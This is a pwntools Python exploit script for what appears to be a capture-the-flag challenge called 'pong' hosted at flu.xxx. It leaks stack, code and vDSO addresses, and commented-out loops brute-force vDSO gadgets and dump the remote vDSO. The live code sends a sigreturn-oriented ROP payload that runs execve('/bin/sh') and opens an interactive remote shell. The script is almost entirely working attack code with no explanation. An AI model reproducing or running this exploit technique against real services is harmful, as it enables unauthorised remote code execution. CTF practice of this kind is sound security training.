from pwn import *


###Exploit
offset = 0x100
offset = 0x500
#800
#offset = 0x5f6
known = [0x59c, 0x5df, 0x5ee,
         0x630, 0x633, 0x635, 0x63a, 0x63b, 0x63c, 0x63d, 0x642, 0x644, 0x649, 0x64b, 0x64c, 0x64d, 0x64e, 0x650, 0x651, 0x657, 0x659, 0x65a, 0x65c, 0x65d, 0x65e, 0x660, 0x661, 0x662, 0x663, 0x664, 0x666, 0x66d, 0x66e, 0x673, 0x675, 0x677,
         0x6c6, 0x6cb, 0x6d7,
         0x72a,
         0x7a7,
         0x7df, 0x7f0,
         0x821,
         0x83a, 0x83f, 0x840,
         0x872, 0x87c,
         0x8a4, 0x8b0,
         0x8f5,
         0x911,
         ]
#66a, 6c4, 7ba, 89c, 89d, 89e hangs
'''
#find ret / or other that doesn't modify stack
while True:
    r = remote('flu.xxx', 10060)

    r.send(b'a')
    res = b''
    while len(res) < 0x200:
        res += r.recv(0x200 - len(res))
    #for i in range(0x40):
    #    print(i, hex(u64(res[i*8:i*8+8])))
    stack = u64(res[8*45:8*46]) - 55 * 8 - 0x200 - 1
    code = u64(res[8*33:8*34]) - 0x1000
    vdso = u64(res[8*15:8*16])

    print(hex(stack))
    print(hex(code))
    print(hex(vdso))

    for i in range(3):
        r.send(p64(vdso+offset) + p64(code + 0x1024))
        res = b''
        while len(res) < 0x200:
            res += r.recv(0x200 - len(res))
    try:
        x = r.recv(1)
        known.append(offset)
        print('===',hex(offset))
        input('>')
    except:
        pass
    r.close()
    print(hex(offset))
    offset+=1
'''

'''
pop_rsi_r15_rbp = [0x6c7]
for offset in known:
    r = remote('flu.xxx', 10060)

    r.send(b'a')
    res = b''
    while len(res) < 0x200:
        res += r.recv(0x200 - len(res))
    #for i in range(0x40):
    #    print(i, hex(u64(res[i*8:i*8+8])))
    stack = u64(res[8*45:8*46]) - 55 * 8 - 0x200 - 1
    code = u64(res[8*33:8*34]) - 0x1000
    vdso = u64(res[8*15:8*16])

    print(hex(stack))
    print(hex(code))
    print(hex(vdso))

    for i in range(3):
        r.send(p64(vdso+offset-4) + p64(0) + p64(0) + p64(stack) + p64(code + 0x1024))
        res = b''
        while len(res) < 0x200:
            res += r.recv(0x200 - len(res))
    try:
        x = r.recv(1)
        pop_rsi_r15_rbp.append(offset-4)
        print('===',hex(offset-4))
        input('>')
    except:
        pass
    r.close()
    print(hex(offset-4))
print(pop_rsi_r15_rbp)
'''

'''
vdsof = b''
for foff in range(0, 0x1000, 0x200):
    r = remote('flu.xxx', 10060)
    #r = remote('127.0.0.1', 1440)
    env = {}
    for i in range(8):
        env[str(i)] = str(i)
    #r = process('./pong', env=env)

    r.send(b'a')
    res = b''
    while len(res) < 0x200:
        res += r.recv(0x200 - len(res))
    #for i in range(0x40):
    #    print(i, hex(u64(res[i*8:i*8+8])))
    stack = u64(res[8*45:8*46]) - 55 * 8 - 0x200 - 1
    code = u64(res[8*33:8*34]) - 0x1000
    #remote
    vdso = u64(res[8*15:8*16])
    #local
    #vdso = u64(res[8*13:8*14])

    print(hex(stack))
    print(hex(code))
    print(hex(vdso))

    for i in range(3):
        #r.send(p64(stack + 8) + b'\xeb\xfe')
        r.send(p64(vdso+0x6c7) + p64(0) + p64(0) + p64(vdso+foff) + p64(code + 0x1024))
        res = b''
        while len(res) < 0x200:
            res += r.recv(0x200 - len(res))
    res = b''
    while len(res) < 0x200:
        res += r.recv(0x200 - len(res))
    vdsof += res
    r.close()
with open('r_vdso', 'wb') as f:
    f.write(vdsof)
'''

context.arch = 'amd64'

r = remote('flu.xxx', 10060)

r.send(b'a')
res = b''
while len(res) < 0x200:
    res += r.recv(0x200 - len(res))
#for i in range(0x40):
#    print(i, hex(u64(res[i*8:i*8+8])))
stack = u64(res[8*45:8*46]) - 55 * 8 - 0x200 - 1
code = u64(res[8*33:8*34]) - 0x1000
vdso = u64(res[8*15:8*16])

print(hex(stack))
print(hex(code))
print(hex(vdso))

V_nop = 0x66d
V_syscall = 0x66b

ROPchain = p64(vdso + V_nop) + p64(vdso + V_syscall) + p64(vdso + V_syscall)
s = SigreturnFrame()
s.rax = 0x3b
s.rdi = stack + 0x1f0
s.rsi = stack + 0x1e0
s.rdx = stack + 0x1e8
s.rip = vdso + V_syscall
payload = (ROPchain + bytes(s)).ljust(0x1e0,b'\x00')+p64(stack+0x1f0)+p64(0)+b'/bin/sh\x00'

for i in range(3):
    r.send(payload)
    res = b''
    while len(res) < 0x200:
        res += r.recv(0x200 - len(res))
r.send(b'a'*15)


r.interactive()
